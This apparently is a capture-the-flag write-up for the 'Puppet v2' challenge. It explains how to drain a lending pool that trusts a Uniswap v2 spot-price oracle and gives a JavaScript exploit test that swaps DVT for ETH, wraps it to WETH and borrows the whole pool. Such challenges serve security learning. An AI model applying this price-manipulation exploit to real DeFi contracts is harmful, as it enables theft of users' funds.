# Challenge #9 - Puppet v2    
 The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!

 Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

 You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)  

## Price Manipulation
For this new challenge, as well as the puppet v1 we have to drain the pool contract. In order to do that, 
we need to manipulate the price of WETH/DVT pair in uniswap v2. 

When we look at the contract, we can see that the getOracleQuote() although is using the uniswap v2 official libraries, it 
does the same operation as the puppet v1 and it's still subject to price manipulation. 
Therefore, we can still manipulate the price selling a bunch of DVT tokens and decreasing the amount of eth 
in liquidity. 

The main difference here, is that instead of sending ether, to the borrow function in the lending pool contract we have to send weth in order
to borrow DVT tokens. So, we'll have to exchange or DVT tokens for ETH in uniswap and then convert all our ETH to WETH and 
hope that we have a higher amount of WETH that the calculateDepositRequired() requires.

## Exploit 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		// Approve DVT
        await this.token.connect(attacker).approve(
            this.uniswapRouter.address,
            ethers.utils.parseEther('10000'),
        );
		//Swap tokens for ETH
		await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
			ATTACKER_INITIAL_TOKEN_BALANCE,
			0,
			[this.token.address, this.weth.address],
			attacker.address,
			(await ethers.provider.getBlock('latest')).timestamp * 2,
		);
		// Convert ETH to WETH
		const weth_required = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
		await this.weth.connect(attacker).deposit({value: weth_required});
		// Approve WETH
        await this.weth.connect(attacker).approve(
            this.lendingPool.address,
            weth_required,
        );
		// Drain Pool
		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```
